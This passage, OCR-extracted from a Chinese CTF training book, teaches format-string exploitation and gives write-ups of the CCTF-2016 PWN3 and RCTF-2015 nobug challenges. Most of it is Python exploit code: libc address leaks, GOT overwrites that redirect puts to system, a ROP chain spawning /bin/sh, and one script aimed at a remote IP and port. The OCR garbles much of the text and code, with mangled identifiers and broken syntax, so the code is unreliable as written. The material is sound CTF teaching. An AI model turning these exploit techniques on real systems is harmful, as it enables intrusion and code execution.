14.3额外技巧
557/1144
图14-12函数栈状态
%m2$s
path1
ptr:m1
%m2$s
path1
:m1
X
%m1Ss
%m1$s
oatho
ptr:m0
r:m0
%m0$s
path:....
path:L....
图14-13
path指针指向示意图
path指针分为3级指针，path2→path1→path0→buff，由于改写
内容使用的%s是改写所存地址指向的内容，即如果%s索引到path2
处，则可改写其中存储的地址path1所指向的内容，即改写patho的值；
如果%s索引到path1，则可改写其中存储的地址patho所指向的内
容，即改写buff的值。修改链如下：通过path2的索引lm2修改path0的
值，通过path1的索引lm1修改buff的值。在这个过程中，path2和path1
是无法修改的，由于修改了patho，其值决定了buff的修改位置，所以
---
## Page 558
CTF特训营：技术详解、解题方法与
14.3额外技巧
558/1144
可以修改到buff的多个位置，即可以在buff处存储一个地址target。然
后，通过patho的索引mo修改target所指向的内存地址，实现任意地
址写。
利用代码如下：
 oz 
target ="/sample_1"
def get_io（target):
r_m=COLORED（RAW,“green")
W_m=COLORED（RAW,blue”)
io=zio（target,timeout =9999,print_read=r_m,print_write=w_m)
return io
def get_addr(io,index):
（>)unpeero
data =io.read_until(n")[:-1]
addr=int(data,16)
return addr
m2=0;m1=0;m0=0;path0_last_byte=0;
def modify_index byte（io,index,val):
io.read_until(">>")
payload =
if val == 0:
payload +="%%%dShhn%index
else:
payload +=%%%dc%%%d$hhn"%(val,index)
io.writeline(payload)
def modfiy_ath_byte(io, offset,val):
globalm2,m1,m0,path0lastbyte
#set path1_ptrlastbyte=offset
modify_index_byte(io,m2,offset)
#write data at path
modify_index_byte(io,m1,val)
def set_addr_at_path(io,addr):
---
## Page 559
CTF特训营：技术详解、解题方法与
14.3额外技巧
559/1144
globalm2,m1,m0,path0last byte
data = 164(addr)
for i in range(8):
modfiy_path_byte(io,path0_last_byte+i,ord(data[i]))
#rewind path ptr
modify_index_byte（io,m2,path0_last byte)
#write anywhere
def write_data(io,addr, data):
globalmo
for i in range(len(data)):
set_addr_at_path(io,addr+i)
modify_index_byte(io,m0,ord（data[i])
def pwn(io):
global m2, m1, m0,path0_last_byte
m2=（0x748-0x7fff450)/8+6
m1=（0x7ff1558-0x7ffff450）/8+6
libc_main_start_ret_index=（0x7ffffff478-0x7ffffff450)/8+6
stack_addr_index=（0x7ffff460-0x7ffffff450)/8+6
path1_addr=get_addr（io,m2)
path0_addr=get_addr（io,m1）&（~3)
printhex(path0_addr)
m0 =（path0_addr-path1_addr)/8+m1
patho_lastbyte=path0_addr&Oxff
libc_main_start_ret_addr=get_addr(io,_libc_main_start_ret_index)
#find by libc_database
offsetlibcstartmain_ret=0x21ec5
offset_system=0x0000000000044c40
offset str bin_sh=0x17c09b
#
libcbase=libc_main_startretaddr-offsetlibc_start_main_ret
system_addr=libc_base+offset_system
binsh addr=libc base+offset str bin sh
#findbyROPgadget
p_rdi_ret=0x0000000000400a33
pp_ret=0x0000000000400a30
stack_addr=get_addr(io,stack_addr_index)
ret_rsp=stack_addr+(0x7ff478-0x7ff550)
rop_data =
rop_data += |164(p_rdi_ret) + I64(binsh_addr)
rop_data += 164(system_addr)
write_data(io,ret_rsp,164（pp_ret)
write_data(io,ret_rsp+3*8,rop_data)
#io.gdb_hint()
io.read_until(">>")
---
## Page 560
CTF特训营：技术详解、解题方法与
14.3额外技巧
560/1144
io.writeline("exit")
io.interact()
pwn(io)
具体可参考14.2.2节。
2.只有单次格式化机会
只有单次格式化机会时，修改特定函数可实现多次格式化。
由于格式化漏洞一次性利用所能做的事情很有限，很多时候程序
需要先泄露，根据泄露计算出libc的基址后，再去改写。但是格式化
漏洞能够执行的次数有限（满足不了泄露、改写等），此时可以尝试
改写一些特定位置来实现多次格式化漏洞
1）已知程序栈地址，可以将程序返回地址改写为程序入口，在
程序逻辑上构造循环，从而实现多次利用格式化字符串漏洞的自的。
2）在程序未开启FuliRelro的情况下，直接改写某些函数的got表
地址，以便构造循环逻辑。
3）可以通过函数指针、libc中的hook指针等作为改写位置
最终达到的效果如图14-14所示。
---
## Page 561
CTF特训营：技术详解、解题方法与
14.3额外技巧
561/1144
具体可参考14.2.2节
开始
开始
过程1
寸
格式化字符
格式化字符
串漏洞位置
串漏洞位置
jmp
modify
结束
结束
图14-14构造多次格式化示意图
3.将其他漏洞转换为格式化漏洞
将其他漏洞转换为格式化漏洞，实现任意地址泄露与修改
这种情况主要是由于存在的漏洞的作用很有限，需要将这些漏洞
转换为功能更加强大的格式化字符串漏洞，然后进行利用。这种情况
通常是，能够实现部分地址写，如覆盖函数钩子指针或者函数got表
等情况，但是无法实现任意地址泄露或者任意地址改写，此时将这些
---
## Page 562
CTF特训营：技术详解、解题方法与
14.3额外技巧
562/1144
地址改写成printf函数，即可泄露出更多信息或者改写更多地址等。
具体可参见14.2.3节。
---
## Page 563
CTF特训营：技术详解、解题方法与
14.4.1 (CCTF-2016)PWN3(PWN350)
563/1144
14.4真题解析
14.4.1{CCTF-2016}PWN3(PWN350)
这道题应该是三道PWN题中最简单的一道，是关于格式化字符
串的，漏洞处如图14-15所示。
int get_file()
char dest[200];// [sp+1ch] [bp-FCh]@5
char s1[40];//[sp+E4h] [bp-34h]@1
struct_file_info *each_file;// [sp+10ch] [bp-Chj@3
printf(enter the file nane you want to get:);
isoc99_scanf("240s"，s1);
if（strncnp（s1，“flag"，4u）)
puts("too young,too sinple);
for （each_file =file_head;each_file; each_file = each_file->next）
if（!strcnp（each_file->name,s1))
strcpy(dest,each_file->content);
return printf(dest);
")
io.writeline("dir")
def get_file(io,name):
io.read_until("ftp>")
io.writeline("get")
io.read_until("")
io.writeline(name)
def pwn(io):
#sample
#elf_info=get_elf_info（elf_path)
name =“sysbdmin"
io.read_until("Name (ftp.hacker.server:Rainism):")
io.writeline()
real name=[chr（ord(c)-1)forcinname]
realname=
"join(real_name)
io.writeline(real_name)
malloc_got =0x0804a024
puts_got=0x0804a028
name="aaaa”
#content ="AAAA"+“B"*4+"C"*4+“%7$x."
content = 132(maloc_got) +“%7$s.."
put_file(io,name, content)
get _file(io,name)
data = io.read_until("..")
print [c for c in data]
malloc_addr = 132(data[4:8])
---
## Page 565
CTF特训营：技术详解、解题方法与
14.4.1 (CCTF-2016)PWN3(PWN350)
565/1144
print“malloc_addr:",hex(malloc_addr)
#local
offset_malloc = 0x00076550
offset_system=0x0003e800
#remote
offset_malloc=0x000766b0
offset_system=0x00040190
libc_base=malloc_addr-offset_malloc
system_addr= libc_base+offset_system
print"system_addr:",hex(system_addr)
addr_info=
padding_info = 
system_addr_buff = I32(system_addr)
offset = 4*4
begin_index=7
for i in range(4):
addr_info += 132(puts_got + i)
val =ord(system_addr_buffil)
count=val-offset
if count<=0:
count += 0x100
padding_info+=%%%dc"%count +"%%%dShhn%(begin_index +i)
offset = val
name = “/bin/sh;"
content = addr_info +padding_info
put_file(io,name,content)
io.gdb_hint()
get_file(io,name)
dir_file(io)
io.interact()
pass
io=get_io（target)
pwn(io)
---
## Page 566
CTF特训营：技术详解、解题方法与
14.4.2 (RCTF-2015)nobug(PWN300)
566/1144
14.4.2{RCTF-2015}nobug（PWN300)
从这道题的汇编代码中可以发现，其中有一个函数返回的地方修
改了栈，跳入了函数sub_8048B32中（如图14-16所示），而该函数中
有一个明显的格式化字符串（如图14-17所示）。
虽然格式化字符串不在栈上，但是格式化可以无限次使用。通过
argv、argvo和path的指向关系，可以实现任意地址改写的效果。具
体代码如下：
96981
call
base64_decode
18BA0
AOE
[esp+och],eax
048BA4
mov
dword ptr [esp+8],offset format;“%s”
48BAC
moV
dwordptr
dwordptr
[esp+4],800h ;maxlen
048BB4
call
[esp],offset byte_804A8Aθ;5
offset sub_8048BD1
_snprintf
8048BCO
08048BC5
push
push
offset sub_8048B32
08048BCA
push
lea
esp,[esp+4]
9
8048BCC
348BD0
retn
图14-16
nobug格式化漏洞反汇编代码
intsub_8048B32（)
intv0;1/eax@1
const char*v1;//eax@1
v0=strlen（s）;
v1=（const char *）base64_decode（（int）s,v0,0）;
return snprintf（byte_804A8A0,0x80ou,v1);
---
## Page 567
CTF特训营：技术详解、解题方法与
14.4.2 (RCTF-2015)nobug(PWN300)
567/1144
图14-17
nobug格式化漏洞反编译代码
from zio import*
importbase64
target='/nobug
target =(180.76.178.48',8888)
def do_fmt(io,fmt):
io.writeline(base64.encodestring(fmt))
d = io.readline().strip()
io.readline()
return d
def write_any(io):
d1=do_fmt（io,%31$p)
argv0=int（d1.strip（n),16）
d2=do_fmt（io，%67$p)
path = int（d2.strip(n),16)
print hex(path)
path=（path+3)/4*4
print hex(path)
index3=（path-argv0)/4+67